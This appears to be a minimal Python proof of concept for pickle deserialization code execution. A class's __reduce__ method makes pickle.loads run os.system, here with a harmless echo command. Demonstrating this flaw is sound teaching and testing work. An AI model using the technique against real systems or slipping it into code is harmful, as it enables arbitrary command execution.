import pickle
import os

class MyClass(object):
    def __reduce__(self):
        return (os.system, ('echo "you have been hacked"',))

pickled = pickle.dumps(MyClass())

# Unpickling the maliciously pickled data:
unpickled = pickle.loads(pickled)
